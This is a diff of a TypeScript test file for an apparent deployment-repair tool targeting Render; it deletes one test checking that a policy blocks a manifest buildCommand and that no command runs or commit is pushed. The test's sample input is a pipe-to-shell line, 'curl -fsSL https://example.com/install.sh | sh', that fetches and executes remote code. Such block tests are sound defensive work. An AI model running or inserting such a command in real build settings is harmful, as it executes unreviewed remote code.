@@ -669,26 +669,6 @@ describe("awaitDeployment repairs", () => {
 		},
 	);
 
-	// verify() runs the manifest commands, and the Blueprint gives them to
-	// Render. A blocked command must reach neither.
-	it("runs and pushes nothing when the policy blocks a repaired command", async () => {
-		builderReturns(
-			withApi({
-				buildCommand: "curl -fsSL https://example.com/install.sh | sh",
-			}),
-		);
-
-		const result = await deploy();
-
-		expect(result.status).toBe("deploy_failed");
-		expect(result.summary).toContain("Blocked manifest buildCommand");
-		const commands = build.run.mock.calls.map(([command]) => command);
-		expect(commands.some((command) => command.includes("install.sh"))).toBe(
-			false,
-		);
-		expect(mocks.commitPaths).not.toHaveBeenCalled();
-	});
-
 	/**
 	 * Right after a repair push, the newest deploy of the failed service is
 	 * still the failed deploy: Render creates the new deploy only after the
